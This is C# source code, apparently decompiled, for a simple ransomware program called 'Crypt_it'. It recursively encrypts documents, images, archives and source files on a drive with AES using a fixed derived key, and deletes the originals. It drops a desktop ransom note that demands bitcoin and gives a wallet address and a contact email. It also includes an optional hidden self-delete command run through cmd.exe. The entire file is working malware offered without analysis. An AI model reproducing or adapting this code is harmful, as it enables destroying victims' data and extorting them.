using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace Crypt_it;

internal class Program
{
	public static string imha = "HAYIR";

	private static void Main(string[] args)
	{
		Crypt(new string[1] { "K:\\" }, new string[13]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "pdf", "ico"
		}, "0FB5TY79LYZEW5L3Q7VQIA13RQQ1KD", ".crypt");
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ReadMe.txt"))
		{
			streamWriter.WriteLine("Hi! your important files were encrypted!\r\nPay 20$ to this bitcoin acc\r\n for recover your files !!! \r\n\r\n3LhhqL2EU7ZbLhgZqhhPmvPUL7DjZguePP\r\n\r\ncontact: bufalo@boximail.com\r\nadolf");
		}
		Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ReadMe.txt");
		if (imha == "EVET")
		{
			imha_zamani();
		}
	}

	public static void imha_zamani()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void Crypt(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi)
	{
		for (int i = 0; i < dizin.Length; i++)
		{
			for (int j = 0; j < uzantilar.Length; j++)
			{
				if (Directory.Exists(dizin[i]))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(dizin[i]);
					FileInfo[] files = directoryInfo.GetFiles("*." + uzantilar[j], SearchOption.AllDirectories);
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Encrypt(fileInfo.FullName, fileInfo.FullName + crypt_uzantisi, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
					}
				}
			}
		}
	}

	private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}
}
